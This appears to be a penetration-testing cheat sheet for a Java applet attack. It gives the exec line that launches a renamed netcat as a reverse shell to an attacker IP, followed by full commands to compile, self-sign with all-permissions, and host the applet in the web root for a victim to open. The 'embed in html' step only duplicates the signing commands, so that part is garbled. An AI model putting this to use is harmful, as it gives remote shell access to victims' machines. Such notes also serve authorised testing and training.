# This Java applet will download a file and execute it.

**Change:** 
'<String expath = tmpdir + "evil.exe";>' 
//CHANGE ME if nc.exe name is different

'<f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " AttackerIP PORT -e cmd.exe");>' 
//CHANGE ME
     

-[x] Compile code and then sign the java applet

    /usr/lib/jvm/java-8-openjdk-i386/bin/javac -source 1.7 -target 1.7 Java.java
    echo "Permissions: all-permissions" > /root/manifest.txt
    /usr/lib/jvm/java-8-openjdk-i386/bin/jar cvf Java.jar Java.class
    /usr/lib/jvm/java-8-openjdk-i386/bin/keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123

    /usr/lib/jvm/java-8-openjdk-i386/bin/jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet

    cp Java.class SignedJava.jar /var/www/html/

-[x] Embed applet in an html file and write it to web root folder /var/www/html
    echo "Permissions: all-permissions" > /root/manifest.txt
    /usr/lib/jvm/java-8-openjdk-i386/bin/jar cvf Java.jar Java.class
    /usr/lib/jvm/java-8-openjdk-i386/bin/keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123

    /usr/lib/jvm/java-8-openjdk-i386/bin/jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet

    cp Java.class SignedJava.jar /var/www/html/

-[x] Copy netcat to web root and rename it to an executable file 
    cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe

-[x] From VictimUser browses java.html and reviews warning pop-up

